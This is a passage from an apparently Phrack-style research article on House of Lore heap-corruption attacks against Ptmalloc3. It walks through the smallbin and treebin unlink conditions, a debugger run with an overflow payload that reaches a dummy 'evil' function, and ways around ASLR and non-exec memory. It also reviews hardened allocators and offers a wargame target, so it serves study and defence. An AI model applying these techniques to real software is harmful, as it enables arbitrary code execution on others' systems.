+As we see, the names of our well known &quot;prev_size&quot; and &quot;size&quot; fields have
+been changed, but the meaning remains the same. Furthermore we knew three
+usual bit control to which they added an extra one called &quot;CINUSE_BIT&quot;
+which tells (in a redundant way) that the current chunk is assigned, as
+opposed to that PINUSE_BIT that continues to report the allocation of the
+previous chunk. Both bits have their corresponding checking and assign
+macros.
+
+The known &quot;malloc_state&quot; structure now stores the bins into two different
+arrays for different uses:
+
+
+     mchunkptr  smallbins[(NSMALLBINS+1)*2];
+     tbinptr    treebins[NTREEBINS];
+
+
+The first of them stores free chunks of memory below 256 bytes. Treebins[]
+is responsible for long pieces and uses a special tree organization. Both
+arrays are important in the respective techniques that will be discussed in
+the following sections, providing there more details about its management
+and corruption.
+
+Some of the areas of greatest interest in &quot;malloc_state&quot; are:
+
+     char*      least_addr;
+     mchunkptr  dv;
+     size_t     magic;
+
+ * &quot;least_addr&quot; is used in certain macros to check if the address of a
+   given P chunk is within a reliable range.
+
+ * &quot;dv&quot;, or Designated Victim is a piece that can be used quickly to serve 
+   a small request, and to gain efficiency is typically, by general rule, 
+   the last remaining piece of another small request. This is a value that
+   is used frequently in the smallbin code, and we will see it in the next
+   section.
+
+ * &quot;Magic&quot; is a value that should always be equal to malloc_params.magic 
+   and in principle is obtained through the device &quot;/dev/urandom&quot;. This 
+   value can be XORed with mstate and written into p-&gt;prev_foot for later
+   to retrieve the mstate structure of that piece by applying another XOR
+   operation with the same value. If &quot;/dev/urandom&quot; can not be used, magic
+   is calculated from the time(0) syscall and &quot;0x55555555U&quot; value with 
+   other checkups, and if the constant INSECURE was defined at compile 
+   time magic then directly take the constant value: &quot;0x58585858U&quot;.
+
+For security purposes, some of the most important macros are following:
+
+
+#define ok_address(M, a) ((char*)(a) &gt;= (M)-&gt;least_addr)
+#define ok_next(p, n)    ((char*)(p) &lt; (char*)(n))
+#define ok_cinuse(p)     cinuse(p)
+#define ok_pinuse(p)     pinuse(p)
+#define ok_magic(M)      ((M)-&gt;magic == mparams.magic)
+
+
+which could always return true if the constant INSECURE is defined at
+compile time (which is not the case by default).
+
+
+The last macro that you could be observe frequently is &quot;RTCHECK(e)&quot; which 
+is nothing more than a wrapper for &quot;__builtin_expect(e, 1)&quot;, which in time 
+is more familiar from previous studies on malloc.
+
+As we said, &quot;malloc_params&quot; contains some of the properties that can be
+established through &quot;mallopt(int param, int value)&quot; at runtime, and
+additionally we have the structure &quot;mallinfo&quot; that maintains the global
+state of the allocation system with information such as the amount of 
+already allocated space, the amount of free space, the number of total free
+chunks, etc...
+
+Talking about the management of Mutex and treatment of Threads in Ptmalloc3
+is something beyond the scope of this article (and would probably require 
+to write an entire book), so we will not discuss this issue and will rather
+go forward.
+
+In the next section we see that every precaution that have been taken are 
+not sufficient to mitigate the attack presented here.
+
+
+
+               &lt;&lt; Software is like entropy: It is
+                  difficult to grasp, weighs nothing,
+                  and obeys the Second Law of Thermodynamics:
+                  i.e., it always increases. &gt;&gt;
+
+                                         [ Norman Augustine ]
+
+
+
+             .---------------------------------.
+---[ 4.1 ---[   SmallBin Corruption (Reverse)   ]---
+             .---------------------------------.
+
+In an attempt to determine whether THoL could be viable in this last
+version of Wolfram Gloger. This version have a lot security mechanisms and 
+integrity checks against heap overflows, fortunately I discovered a variant
+of our smallbin corruption method, this variant could be applied.
+
+To begin, we compile Ptmalloc3 and link the library statically with the
+vulnerable application presented in 2.2.1. After using the same method to
+exploit that application (by adjusting the evil_func( ) address of course,
+which would be our dummy shellcode), we obtain a segment violation at
+malloc.c, particularly in the last instruction of this piece of code:
+
+
+----- snip -----
+
+void* mspace_malloc(mspace msp, size_t bytes) {
+  .....
+  if (!PREACTION(ms)) {
+    .....
+    if (bytes &lt;= MAX_SMALL_REQUEST) {
+    .....
+      if ((smallbits &amp; 0x3U) != 0) {
+        .....
+        b = smallbin_at(ms, idx);
+        p = b-&gt;fd;
+        unlink_first_small_chunk(ms, b, p, idx);
+
+----- snip -----
+
+
+Ptmalloc3 can use both dlmalloc( ) and mspace_malloc( ) depending on
+whether the constant &quot;ONLY_MSPACES&quot; has been defined at compile-time (this 
+is the default option -DONLY_MSPACES). This is irrelevant for the purposes 
+of this explanation since the code is practically the same for both 
+functions.
+
+The application breaks when, after having overwritten the &quot;bk&quot; pointer of 
+buff2, one requests a new buffer with the same size. Why does it happen?
+
+As you can see, Ptmallc3 acts in an opposite way of Ptmalloc2. Ptmalloc2 
+attempts to satisfy the memory request with the last piece in the bin, 
+however, Ptmalloc3 intends to cover the request with the first piece of the
+bin: &quot;p = b-&gt;fd&quot;.
+
+mspace_malloc () attempts to unlink this piece of the corresponding bin to 
+serve the user request, but something bad happens inside the 
+&quot;unlink_first_small_chunk( )&quot; macro, and the program segfaults.
+
+Reviewing the code, we are interested by a few lines:
+
+
+----- snip -----
+
+#define unlink_first_small_chunk(M, B, P, I) {\
+  mchunkptr F = P-&gt;fd;\                  [1]
+  .....
+  if (B == F)\
+    clear_smallmap(M, I);\
+  else if (RTCHECK(ok_address(M, F))) {\ [2]
+    B-&gt;fd = F;\                          [3]
+    F-&gt;bk = B;\                          [4]
+  }\
+  else {\
+    CORRUPTION_ERROR_ACTION(M);\
+  }\
+}
+
+----- snip -----
+
+
+Here, P is our overwritten chunk, and B is the bin belonging to that piece.
+In [1], F takes the value of the &quot;fd&quot; pointer that we control (at the same 
+time that we overwrote the &quot;bk&quot; pointer in buff2).
+
+If [2] is overcome, which is a security macro we've seen in the previous
+section:
+
+
+    #define ok_address(M, a) ((char*)(a) &gt;= (M)-&gt;least_addr)
+
+
+where the least_addr field is &quot;the least address ever obtained from 
+MORECORE or MMAP&quot;... then anything of higher value will pass this test.
+
+We arrive to the classic steps of unlink, in [3] the &quot;fd&quot; pointer of the 
+bin points to our manipulated address. In [4] is where a segmentation 
+violation occurs, as it tries to write to (0x41414141)-&gt;bk the address of 
+the bin. As it falls outside the allocated address space, the fun ends.
+
+For the smallbin corruption technique over Ptmalloc3 it is necessary to 
+properly overwrite the &quot;fd&quot; pointer of a freed buffer with a random 
+address. After, it is necessary to try making a future call to malloc( ), 
+with the same size, that returns the random address as the allocated space.
+
+The precautions are the same as in 2.2.1, F-&gt;bk must contain a writable 
+address, otherwise it will cause an access violation in [4].
+
+If we accomplish all this conditions, the first chunk of the bin will be 
+unlinked and the following piece of code will be triggered.
+
+
+----- snip -----
+
+        mem = chunk2mem(p);
+        check_malloced_chunk(gm, mem, nb);
+        goto postaction;
+
+        .....
+        postaction:
+            POSTACTION(gm);
+            return mem;
+
+----- snip -----
+
+
+I added the occasional printf( ) sentence into mspace_malloc( ) and the 
+unlink_first_small_chunk( ) macro to see what happened, and the result was 
+as follow:
+
+
+Starting program: /home/black/ptmalloc3/thl `perl -e 'print &quot;A&quot;x24 .
+&quot;\x28\xf3\xff\xbf&quot;'` &lt; evil.in                                                                             
+
+[mspace_malloc()]: 16 bytes &lt;= 244
+Buff1 -&gt; [ 0xb7feefe8 ]
+[mspace_malloc()]: 128 bytes &lt;= 244
+Buff2 -&gt; [ 0xb7fef000 ]
+Buff3 -&gt; [ 0xb7fef088 ]
+
+Buff4 -&gt; [ 0xb7fef190 ]
+
+[mspace_malloc()]: 128 bytes &lt;= 244
+[unlink_first_small_chunk()]: P-&gt;fd = 0xbffff328
+LB1 -&gt; [ 0xb7fef000 ]
+
+[mspace_malloc()]: 128 bytes &lt;= 244
+[unlink_first_small_chunk()]: P-&gt;fd = 0xbffff378
+LB2 -&gt; [ 0xbffff330 ]
+
+Which is your favourite hobby:
+This is an evil function. You become a cool hacker if you are able to
+execute it
+
+
+&quot;244&quot; is the present value of MAX_SMALL_REQUEST, which as we can see, is 
+another difference from Ptmalloc2, which defined a smallbin whenever 
+requested size was less than 512. In this case the range is a little more 
+limited.
+
+
+
+               &lt;&lt; From a programmer's point of view,
+                  the user is a peripheral that types
+                  when you issue a read request. &gt;&gt;
+
+                                      [ P. Williams ]
+
+
+
+             .----------------------------------------.
+---[ 4.2 ---[   LargeBin Method (TreeBin Corruption)   ]---
+             .----------------------------------------.
+
+At this point of the article, we have understood the basic concepts 
+correctly. One could now continue to study on his own the Ptmalloc3 
+internals.
+
+In Ptmalloc3, large chunks (ie larger than 256 bytes), are stored in a tree
+structure where each chunk has a pointer to its father, and retains two 
+pointers to its children (left and right) if having any. The code that 
+defines this structure is the following:
+
+
+----- snip -----
+
+struct malloc_tree_chunk {
+  /* The first four fields must be compatible with malloc_chunk */
+  size_t                    prev_foot;
+  size_t                    head;
+  struct malloc_tree_chunk* fd;
+  struct malloc_tree_chunk* bk;
+
+  struct malloc_tree_chunk* child[2];
+  struct malloc_tree_chunk* parent;
+  bindex_t                  index;
+};
+
+----- snip -----
+
+
+When a memory request for a long buffer is made, the
+&quot;if (bytes &lt;= MAX_SMALL_REQUEST) {}&quot; sentence fails, and the executed code,
+if nothing strange happens, is as follow:
+
+
+----- snip -----
+
+    else {
+      nb = pad_request(bytes);
+      if (ms-&gt;treemap != 0 &amp;&amp; (mem = tmalloc_large(ms, nb)) != 0) {
+        check_malloced_chunk(ms, mem, nb);
+        goto postaction;
+      }
+    }
+
+----- snip -----
+
+
+Into tmalloc_large( ), we aim to achieve this code:
+
+
+----- snip -----
+
+  if (v != 0 &amp;&amp; rsize &lt; (size_t)(m-&gt;dvsize - nb)) {
+    if (RTCHECK(ok_address(m, v))) { /* split */
+      .....
+      if (RTCHECK(ok_next(v, r))) {
+        unlink_large_chunk(m, v);
+        if (rsize &lt; MIN_CHUNK_SIZE)
+          set_inuse_and_pinuse(m, v, (rsize + nb));
+        else {
+          set_size_and_pinuse_of_inuse_chunk(m, v, nb);
+          set_size_and_pinuse_of_free_chunk(r, rsize);
+          insert_chunk(m, r, rsize);
+        }
+        return chunk2mem(v);
+        .....
+
+----- snip -----
+
+
+If we tried to exploit this program in the same way as for Ptmalloc2, the
+application would break first in the &quot;unlink_large_chunk( )&quot; macro, which 
+is very similar to &quot;unlink_first_small_chunk( )&quot;. The most important lines 
+of this macro are these:
+
+
+    F = X-&gt;fd;\ [1]
+    R = X-&gt;bk;\ [2]
+    F-&gt;bk = R;\ [3]
+    R-&gt;fd = F;\ [4]
+
+
+Thus we now know that both the &quot;fd&quot; and &quot;bk&quot; pointers of the overwritten
+chunk must be pointing to writable memory addresses, otherwise this could
+lead to an invalid memory access.
+
+The next error will come in: &quot;set_size_and_pinuse_of_free_chunk(r, rsize)&quot;,
+which tells us that the &quot;size&quot; field of the overwritten chunk must be
+user-controlled. And so again, we need the vulnerable application to allow
+us introducing NULL bytes.
+
+If we can accomplish this, the first call to &quot;malloc(1536)&quot; of the 
+application shown in section 3 will be executed correctly, and the issue 
+will come with the second call. Specifically within the loop:
+
+
+----- snip -----
+
+  while (t != 0) { /* find smallest of tree or subtree */
+    size_t trem = chunksize(t) - nb;
+    if (trem &lt; rsize) {
+      rsize = trem;
+      v = t;
+    }
+    t = leftmost_child(t);
+  }
+
+----- snip -----
+
+
+When you first enter this loop, &quot;t&quot; is being equal to the address of the 
+first chunk in the tree_bin[] corresponding to the size of the buffer 
+requested. The loop will continue while &quot;t&quot; has still some son and, finally
+&quot;v&quot; (victim) will contain the smallest piece that can satisfy the request.
+
+The trick for saving our problem is to exit the loop after the first 
+iteration. For this, we must make &quot;leftmost_child(t)&quot; returning a &quot;0&quot; 
+value.
+
+Knowing the definition:
+
+
+#define leftmost_child(t) ((t)-&gt;child[0] != 0? (t)-&gt;child[0]:(t)-&gt;child[1])
+
+
+The only way is to place (buff2-&gt;bk) in an address of the stack. It is 
+necessary the pointers child[0] and child[1] with a &quot;0&quot; value, which means 
+no more children. Then &quot;t&quot; (and therefore &quot;v&quot;) will be provided while the 
+&quot;size&quot; field not fails the if( ) sentence.
+
+
+
+               &lt;&lt; Before software should be
+                  reusable, it should be usable. &gt;&gt;
+
+                                  [ Ralph Johnson ] 
+
+
+
+             .-----------------------------.
+---[ 4.3 ---[   Implement Security Checks   ]---
+             .-----------------------------.
+
+Ptmalloc3 could be safer than it seems at first, but for this, you should
+have defined the FOOTERS constant at compile time (which is not the default
+case).
+
+We saw the &quot;magic&quot; parameter at the beginning of section 4, which is 
+present in all malloc_state structures and the way in which it is 
+calculated. The reason why &quot;prev_size&quot; now is named as &quot;prev_foot&quot; if that 
+if FOOTERS is defined, then this field is used to store the result of a XOR
+operation between the mstate belonging to the chunk and the magic value 
+recently calculated. This is done with:
+
+
+/* Set foot of inuse chunk to be xor of mstate and seed */
+#define mark_inuse_foot(M,p,s)\
+ (((mchunkptr)((char*)(p)+(s)))-&gt;prev_foot = ((size_t)(M) ^ mparams.magic))
+
+
+XOR, as always, remains being a symmetric encryption that allows, at the 
+same time, saving the malloc_state address and establishing a kind of 
+cookie to prevent a possible attack whenever altered. This mstate is 
+obtained with the following macro:
+
+
+#define get_mstate_for(p)\
+  ((mstate)(((mchunkptr)((char*)(p) +\
+    (chunksize(p))))-&gt;prev_foot ^ mparams.magic))
+
+
+For example, at the beginning of the &quot;mspaces_free( )&quot; function which is 
+called by the wrapper free( ), is started in this way:
+
+
+   #if FOOTERS
+       mstate fm = get_mstate_for(p);
+   #else /* FOOTERS */
+       mstate fm = (mstate)msp;
+   #endif /* FOOTERS */
+       if (!ok_magic(fm)) {
+         USAGE_ERROR_ACTION(fm, p);
+         return;
+       }
+
+
+If we corrupt the header of an allocated chunk (and therefore the prev_foot
+field). When the chunk was freed, get_mstate_for( ) will return an 
+erroneous arena. At this moment ok_magic( ) will test the &quot;magic&quot; value of 
+that area and it will abort the application.
+
+Moreover, one must be aware that the current flow could be broken even
+before the USAGE_ERROR_ACTION( ) call if the reading of fm-&gt;magic causes a 
+segmentation fault due to wrong value obtained by get_mstate_for( ).
+
+How to deal with this cookie and the probability analysis in order to
+predict its value at runtime is an old issue, and we will not talk more
+here about it. Though one could remember the PaX case, perhaps an 
+overwritten pointer can point beyond the &quot;size&quot; field of a chunk, and 
+through a future STRxxx( ) or MEMxxx( ) call, crush their data without have
+altered &quot;prev_foot&quot;. Skape made an excellent job in his &quot;Reducing the 
+effective entropy of gs cookies&quot; [4] for the Windows platform. It could 
+give you some fantastic ideas to apply. Who knows, it all depends on the 
+vulnerability and inherent requirements of the tested application. 
+
+What is the advantage of THoL according to this protection? It is very 
+clear, the target chunk is corrupted after its release, and therefore the 
+integrity checks are passed.
+
+Anyway, there should be ways to mitigate these kinds of problems, to start,
+if we all know that no memory allocation should proceed belonging to a 
+stack location, one could implement something as simple as this:
+
+#define STACK_ADDR 0xbff00000
+
+#define ok_address(M, a) (((char*)(a) &gt;= (M)-&gt;least_addr)\
+			  &amp;&amp; ((a) &lt;= STACK_ADDR))
+
+
+and the application is aborted before getting a successful exploitation.
+Also a check as ((a) &gt;&gt; 20) == 0xbff) should be effective. It is only an
+example, the relative stack position could be very different in your 
+system, it is a very restrictive protection.
+
+Anyone who read the source code base has probably noticed that Ptmalloc3's
+unlink...( ) macros omit the classic tests that implanted in glibc to check
+the double linked list. We do not consider this because we know that a real
+implementation would take it into account and should add this integrity 
+check. However, I can not perform a more detailed stud until someone 
+decides in a future that glibc will be based on Ptmalloc3.
+
+The conclusion of this overview is that some of the techniques detailed in
+the Maleficarum &amp; Des-Maleficarum papers are not reliable in Ptmalloc3. One
+of them, for example, is The House of Force. Remember that it needs both to 
+overwrite the &quot;size&quot; field of the wilderness chunk and a request with a 
+user-defined size. This was possible partly in Ptmalloc2 because the size 
+of the top chunk was read in this way:
+
+
+    victim = av-&gt;top;
+    size = chunksize(victim);
+
+
+Unfortunately, now Ptmalloc3 saves this value in the &quot;malloc_state&quot; and 
+reads it directly with this:
+
+
+   size_t rsize = (g)m-&gt;topsize // gm for dlmalloc( ), m for 
+                                // mspace_malloc( )
+
+
+In any case, it is worth recalling one of the comments present at the 
+beginning of &quot;malloc.c&quot;:
+
+     &quot;This is only one aspect of security -- these checks do not,
+      and cannot, detect all possible programming errors&quot;.
+
+
+
+               &lt;&lt; Programming without an overall architecture
+                  or design in mind is like exploring a cave
+                  with only a flashlight: You don't know where
+                  you've been, you don't know where you're going,
+                  and you don't know quite where you are. &gt;&gt;
+
+                                                 [ Danny Thorpe ]
+
+
+
+               .-----------------------------------.
+---[ 4.3.1 ---[   Secure Heap Allocator (Utopian)   ]---
+               .-----------------------------------.
+
+First, there is no way to create a &quot;heap allocator&quot; totally secure, it's
+impossible (note: you can design the most secure allocator in the world but
+if it's too slow =&gt; it's no use). To begin with, and the main rule (which
+is fairly obvious), implies that the control structures or more simply,
+headers, can not be located being adjacent to the data. Create a macro that
+adds 8 bytes to the address of a header for direct access to data is very
+simple, but has never been a safe option.
+
+However, although this problem will be solved, still others thought to
+corrupt the data of another allocated chunk is not useful if it not allows
+arbitrary code execution, but and if these buffers contain data whose
+integrity has to be guaranteed (financial information, others...)?
+
+Then we came to the point in which it is essential the use cookies between 
+the fragments of memory assigned. It obviously has side effects. The most
+efficient would be that this cookie (say 4 bytes) will be the last 4 bytes
+of each allocated chunk, with the target of preserve the alignment, since
+that put them between two  chunks required a more complicated and possibly
+slower management.
+
+Besides this, we could also take ideas from &quot;Electric Fence - Red-Zone
+memory allocator&quot; by Bruce Perens [5]. His protection ideas are:
+
+
+   - Anti Double Frees:
+
+	if ( slot-&gt;mode != ALLOCATED ) {
+ 		if ( internalUse &amp;&amp; slot-&gt;mode == INTERNAL_USE )
+			.....
+		else {
+			EF_Abort(&quot;free(%a): freeing free memory.&quot;,address);
+
+   - Free unallocated space (EFense maintains an array of addresses
+     of chunks allocated (slots) ):
+
+	slot = slotForUserAddress(address);
+	if ( !slot )
+		EF_Abort(&quot;free(%a): address not from malloc().&quot;, address);
+
+
+Other implementations of dynamic memory management that we should take into
+account: Jemalloc on FreeBSD [6] and Guard Malloc for Mac OS X [7].
+
+The first is specially designed for concurrent systems. We talked about
+management of multiple threads on multiple processors, and how to achieve 
+this efficiently, without affecting system performance, and getting better 
+times in comparison with other memory managers.
+
+The second, to take one example, use the pagination and its mechanism of
+protection in a very clever way. Extracted directly from the manpage, we 
+read the core of his method:
+
+   &quot;Each malloc allocation is placed on its own virtual memory page, with 
+    the end of the buffer at the end of the page's memory, and the next 
+    page is kept unallocated. As a result, accesses beyond the end of the 
+    buffer cause a bus error immediately. When memory is freed, libgmalloc 
+    deallocates its virtual memory, causing reads or writes to the freed 
+    buffer cause a bus error.&quot;
+
+Note: That's a really interesting idea but you should take into account the
+fact that such a technic is not _that_ effective because if would sacrifice
+a lot of memory. It would induce a PAGE_SIZE (4096 bytes is a common value,
+or getpagesize( ) ;) allocation for a small chunk.
+
+In my opinion, I do not see Guard Malloc as a memory manager of routine 
+use, but rather as an implementation with which to compile your programs in
+the early stages of development/debugging.
+
+However, Guard Malloc is a highly user-configurable library. For example,
+you could allow through an specific environment variable 
+(MALLOC_ALLOW_READS) to read past an allocated buffer. This is done by 
+setting the following virtual page as Read-Only. If this variable is 
+enabled along with other specific environment variable 
+(MALLOC_PROTECT_BEFORE), you can read the previous virtual page. And still 
+more, if MALLOC_PROTECT_BEFORE is enabled without MALLOC_ALLOW_READS buffer
+underflow can be detected. But this is something that you can read in the 
+official documentation, and it's needless to say more here.
+
+
+
+               &lt;&lt; When debugging, novices insert corrective
+                  code; experts remove defective code. &gt;&gt;
+
+                                         [ Richard Pattis ]
+
+
+
+               .------------.
+---[ 4.3.2 ---[   dnmalloc   ]---
+               .------------.
+
+This implementation (DistriNet malloc) [10] is like the most modern 
+systems: code and data are loaded into separate memory locations, dnmalloc 
+applies the same to chunk and chunk information which are stored in 
+separate contiguous memory protected by guard pages. A hashtable which 
+contains pointers to a linked list of chunk information accessed through 
+the hash function is used to associate chunks with the chunks information.
+[12]
+
+Memory with dnmalloc:
+
+        .---------------.
+        |  .text        |
+        .---------------.
+        |  .data        |
+        .---------------.
+           ...        
+        .---------------.
+        |  Chunks        |
+        .---------------.
+            ..
+            ||
+            ||  
+            \/
+        
+            /\
+            || 
+            ||
+            ..
+        .--------------------.
+        |  Memory Page       | &lt;- This Page is not writable
+        .--------------------. 
+        |  Chunk Information |
+        .--------------------.
+        |  The Hash Table    |
+        .--------------------. 
+        |  Memory Page       | 
+        .--------------------. 
+        |  The Stack         | &lt;- This Page is not writable
+        .--------------------.
+
+The way to find the chunk information:
+
+1.- Address of the chunk - Start address of the heap = *Result*
+
+2.- To get the entry in the Hash Table: shift *Result* 7 bits to the right.
+
+3.- Go over the linked list till it have the correct chunk.
+
+ .-------------------------------------.
+ |           The Hash Table            |
+ . ................................... . 
+ |  Pointers to each Chunk Information | --&gt; Chunk Information (Hash Next 
+ .-------------------------------------.     to the next Chunk Information)
+
+The manipulation of the Chunk Information:
+
+1.- A fixed area is mapped below the Hash table for the Chunks Information.
+
+2.- Free Chunk Information are stored in a linked list.
+
+3.- When a new Chunk Information is needed the first element in the free 
+    list is used.
+
+4.- If none are free a Chunk is allocated from the map.
+
+5.- If the map is empty It maps extra memory for it (and move the guard 
+    page).
+
+6.- Chunk information is protected by guard pages.
+
+
+
+               &lt;&lt; Passwords are like underwear: you don't let
+                  people see it, you should change it very often,
+                  and you shouldn't share it with strangers. &gt;&gt;
+
+                                                [ Chris Pirillo ] 
+
+
+
+               .------------------.
+---[ 4.3.3 ---[   OpenBSD malloc   ]---
+               .------------------.
+
+This implementation [11] [13] have the design goals: simple, unpredictable,
+fast, less metadata space overhead, robust for example freeing of a bogus 
+pointer or a double free should be detected ... 
+
+About the Metadata: keep track of mmaped regions by storing their address 
+and size into a hash table, keep existing data structure for chunk 
+allocations, a free region cache with a fixed number of slots:
+
+Free regions cache
+
+1.- Regions freed are kept for later reuse
+
+2.- Large regions are unmapped directly
+
+3.- If the number of pages cached gets too large, unmap some.
+
+4.- Randomized search for fitting region, so region reuse is less
+    predictable
+
+5.- Optionally, pages in the cache are marked PROT_NONE
+
+
+
+               &lt;&lt; Getting information off the Internet is
+                  like taking a drink from a fire hydrant. &gt;&gt;
+
+                                           [ Mitchell Kapor ]
+
+
+
+           .-----------------------------.
+---[ 5 ---[   Miscellany, ASLR and More   ]---
+           .-----------------------------.
+
+We already mentioned something about ASLR and Non Exec Heap in the Malloc
+Des-Maleficarum paper. Now we do the same with the method we have studied.
+
+For the purposes of this technique, I considered disabled the ASLR in all
+examples of this article. If this protection was enabled in real life then
+randomization only affects to the position of the final fake chunk in the
+stack and our ability to predict a memory address close enough to a saved
+return address that can be overwritten. This should not be an utterly 
+impossible task, and we consider that the bruteforce is always a 
+possibility that we will have a hand in most restrictive situations.
+
+Obviously, the non-exec heap does not affect the techniques described in
+this paper, as one might place a shellcode in any elsewhere, although we
+warn that if the heap is not executable it is very likely that the stack 
+will not be either. Therefore one should use a ret2libc style attack or 
+return into mprotect( ) to avoid this protection.
+
+This is an old theme, and each will know how to analyze problems underlying
+the system attacked.
+
+Unfortunately, I do not show a real-life exploit here. But we can talk a 
+bit about the reliability and potential of success when we are studying a
+vulnerability in the wild.
+
+The preconditions are clear, this has been seen repeatedly throughout of
+this article. The obvious difference between the PoC's that I presented 
+here and the applications you use every day (as well as email clients, or
+web browsers), is that one can not predict in a first chance the current 
+state of the heap. And this is really a problem, because while this is not 
+in a fairly stable and predictable state, the chances of exploiting will be
+minimal.
+
+But very high-level hackers have already met once this class of problems,
+and over time have been designing and developing a series of techniques
+which allow reordering the heap so that both, the position of the allocated
+chunks as the data contained within them, are parameters controlled by the
+user. Among these techniques, we must appoint two best known:
+
+   - Heap Spray
+   - Heap Feng Shui
+
+You can read something about them in the following paper presented at the
+BlackHat 2007 [8]. In short we can say that the &quot;Heap Spray&quot; technique
+simply fill in the heap as far as possible by requesting large amount of
+memory placing there repetitions of nop sleds and the opportune shellcode,
+then just simply find a predictable memory address for the &quot;primitive 
+4-byte overwrite&quot;. A very clever idea in this technique is to make the nop 
+sled values equal to the selected address, so that it will be 
+self-referential.
+
+Feng Shui is a much more elaborate technique, it first tries to defragment 
+the Heap by filling the holes. Then it comes back to create holes in the
+upper controlled zone so that the memory remains as:
+
+   [ chunk | hole | chunk | hole | chunk | hole | chunk ]
+
+... and finally tries to create the buffer to overflow in one of these 
+holes, knowing that this will always be adjacent to one of its buffers 
+containing information controlled by the exploiter.
+
+We will not talk about it more here. Just say that although some of these
+methodologies may seem time consuming and fatigue making, without them
+nobody could create reliable exploits, or obtain success in most of the
+attempts.
+
+
+
+               &lt;&lt; Programming today is a race between software
+                  engineers striving to build bigger and better
+                  idiot-proof programs, and the Universe trying
+                  to produce bigger and better idiots. So far,
+                  the Universe is winning. &gt;&gt;
+
+                                                  [ Rich Cook ]
+
+
+
+           .---------------.
+---[ 6 ---[   Conclusions   ]---
+           .---------------.
+
+In this article we have seen how The House of Lore hid inside of itself a
+power much greater than we imagined. We also presented a fun example 
+showing that, despite not being vulnerable to all the techniques we knew so
+far, it was still vulnerable to one that until now had only been described
+theoretically.
+
+We detail a second method of attack also based on the corruption of a 
+largebin, this attack could be an alternative in some circumstances and 
+should be as important as the main method of the smallbin  corruption.
+
+Finally we detailed a way to apply THoL in version 3 of the Ptmalloc 
+library, which many thought was not vulnerable to attacks due to the 
+imposition of numerous restrictions.
+
+Reviewing and analyzing in depth some of the security mechanisms that have
+been implanted in this library, allowed to find that further studies will 
+be needed to discover new vulnerabilities and areas of code that can be 
+manipulated for personal fun and profit.
+
+If you want a tip from mine on how to improve your hacking, here goes:
+
+Reads everything, study everything... then forget it all and do it 
+differently, do it better. Fill your cup, empty your cup and fill it again 
+with fresh water.
+
+Finally, I would like to recall that I said the following in my &quot;Malloc
+Des-Maleficarum&quot; paper:
+
+     &quot;...and The House of Lore, although not very suitable for a
+      credible case, no one can say that is a complete exception...&quot;
+
+With this new article I hope I have changed the meaning of my words, and
+shown that sometimes in hacking you make mistakes, but never stop to 
+investigate and repair your errors. Everything we do is for fun, and we 
+will do it as long as we exist on the land and cyberspace.
+
+
+
+               &lt;&lt; All truths are easy to understand
+                  once they are discovered;
+                  the point is to discover them. &gt;&gt;
+
+                                [ Galileo Galilei ]
+
+
+
+           .-------------------.
+---[ 7 ---[   Acknowledgments   ]---
+           .-------------------.
+
+First, I would like to give my acknowledgments to Dreg for his insistence 
+for that I would do something with this paper and it not to fall into 
+oblivion. After a bad time ... I could not give a talk on this subject at 
+RootedCon [9], Dreg still graciously encouraged me to finish the 
+translation and publish this article in this fantastic e-zine which 
+undoubtedly left its mark etched in the hacking history. 
+
+Indeed, the last details in the translation of this article are Dreg's 
+work, and this would never have been what it is without his invaluable 
+help.
+
+For the rest, also thanks to all the people I met in dsrCON!, all very 
+friendly, outgoing and all with their particular point of madness. I am not
+going to give more names, but, to all of them, thanks.
+
+And remember...
+
+Happy Hacking!
+
+
+
+           .--------------.
+---[ 8 ---[   References   ]---
+           .--------------.
+
+[1] Malloc Maleficarum
+    http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt
+
+[2] Malloc Des-Maleficarum
+    http://www.phrack.org/issues.html?issue=66&amp;id=10
+
+[3] PTMALLOC (v2 &amp; v3)
+    http://www.malloc.de/en/
+
+[4] Reducing the effective entropy of gs cookies
+    http://uninformed.org/?v=7&amp;a=2&amp;t=sumry
+
+[5] Electric Fence - Red-Zone memory allocator
+    http://perens.com/FreeSoftware/ElectricFence/
+    electric-fence_2.1.13-0.1.tar.gz
+
+[6] Jemalloc - A Scalable Concurrent malloc(3) Implementacion for FreeBSD
+    http://people.freebsd.org/~jasone/jemalloc/bsdcan2006/jemalloc.pdf
+
+[7] Guard Malloc (Enabling the Malloc Debugging Features)
+    http://developer.apple.com/mac/library/documentation/Darwin/Reference/
+    ManPages/man3/Guard_Malloc.3.html
+
+[8] Heap Feng Shui in JavaScript - BlackHat Europe 2007
+    http://www.blackhat.com/presentations/bh-europe-07/Sotirov/
+    Presentation/bh-eu-07-sotirov-apr19.pdf
+
+[9] Rooted CON: Congreso de Seguridad Informatica (18-20 Marzo 2010)
+    http://www.rootedcon.es/
+
+[10] dnmalloc 
+     http://www.fort-knox.org/taxonomy/term/3
+
+[11] OpenBSD malloc
+     http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/malloc.c
+
+[12] Dnmaloc - A more secure memory allocator by Yves Younan, 
+     Wouter Joosen, Frank Piessens and Hans Van den Eynden
+     http://www.orkspace.net/secdocs/Unix/Protection/Description/
+     Dnmaloc%20-%20A%20more%20secure%20memory%20allocator.pdf
+
+[13] A new malloc(3) for OpenBSD by Otto Moerbeek
+     http://www.tw.openbsd.org/papers/eurobsdcon2009/otto-malloc.pdf
+
+
+
+           .----------------.
+---[ 9 ---[   Wargame Code   ]---
+           .----------------.
+
+In this last section we attach the same program &quot;agents.c&quot; that we saw
+above but adapted to network environment so that it can be feasible to use 
+in a servers exploitation wargame. At the same time the code is a bit more 
+elaborate and robust.
+
+As usual, &quot;netagents.c&quot; forks a child process (fork) for each connection 
+made to it, and as each new process has its own heap, each attacker can 
+confront the vulnerability based on zero. The actions of one not influence
+to others.
+
+The code should be adapted according to the needs of the manager conducting
+or developing the wargame (as well as the number of allowed incoming 
+connections or debugging information you want to give to the attacker if 
+the game becomes very difficult).
+
+The attached archive includes a makefile which assumes that in the same
+directory as the source is the compiled library ptmalloc2 (libmalloc.a) to 
+be linked with netagents.c. Each should adapt &quot;malloc.c&quot; to print the 
+information it deems necessary, but the basics would be the changes that 
+have been made throughout this article, which allows the attacker to know
+from where they extract the chunks of memory requested.
+
+How the attacker obtains the output of these changes? For simplicity,
+&quot;netagents.c&quot; prevents calls to send( ) by closing the standard output 
+(stdout) and duplicating it with the recent obtained client socket 
+(dup(CustomerID)). We use the same trick as the shellcodes expected.
+
+&quot;netagents.c&quot; also includes a new menu option, &quot;Show Heap State&quot;, in order 
+to see the state of the memory chunks that are being allocated or released 
